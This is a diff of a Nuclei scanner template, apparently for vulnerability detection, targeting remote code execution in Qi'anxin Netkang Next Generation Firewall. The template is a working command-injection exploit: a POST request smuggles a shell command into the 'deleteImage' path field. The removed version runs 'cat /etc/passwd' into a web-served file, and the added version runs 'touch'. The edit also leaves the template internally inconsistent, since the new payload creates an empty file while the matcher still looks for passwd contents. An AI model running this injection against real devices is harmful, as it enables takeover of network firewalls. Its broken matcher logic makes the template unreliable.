@@ -1,12 +1,18 @@
 id: qi-anxin-netkang-next-generation-firewall-rce
 
 info:
-  name: Qi'anxin Netkang Next Generation Firewall RCE
+  name: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
   author: pikpikcu
   severity: critical
+  description: |
+    Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.
   reference:
     - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
-  tags: rce
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: rce,firewall,intrusive
 
 requests:
   - raw:
@@ -14,19 +20,21 @@ requests:
         POST /directdata/direct/router HTTP/1.1
         Host: {{Hostname}}
 
-        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/poc.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
+        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
 
       - |
-        GET /poc.txt HTTP/1.1
+        GET /{{randstr}}.txt HTTP/1.1
         Host: {{Hostname}}
 
     matchers-condition: and
     matchers:
       - type: regex
+        part: body
         regex:
           - "root:.*:0:0:"
-        part: body
 
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/05/30
